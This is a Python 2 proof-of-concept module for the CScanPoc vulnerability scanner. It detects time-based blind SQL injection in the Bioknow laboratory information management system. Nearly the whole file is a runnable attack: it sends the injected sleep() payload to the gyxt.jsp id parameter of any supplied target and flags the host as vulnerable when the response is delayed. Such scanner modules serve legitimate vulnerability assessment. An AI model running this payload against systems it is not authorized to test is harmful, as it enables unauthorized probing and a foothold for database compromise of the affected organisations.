# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Bioknow_0005'  # 平台漏洞编号，留空
    name = '百奥知实验室综合信息管理系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-16'  # 漏洞公布时间
    desc = '''
        百奥知实验室综合信息管理系统：
        /portal/root/lims_std/gyxt.jsp?id=a
        /portal/root/lims_std/gyxt.jsp?id=a
        处存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '百奥知实验室综合信息管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '73c56f14-409e-440b-be05-b7dc303b9ec3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-31'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.2 http://www.wooyun.org/bugs/wooyun-2010-0108186
            payload1 = "/portal/root/lims_std/gyxt.jsp?id=a'%20or%201=sleep(5)%20and%20'1'='1"
            payload2 = "/portal/root/lims_std/gyxt.jsp?id=a'%20or%201=sleep(0)%20and%20'1'='1"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(self.target + payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
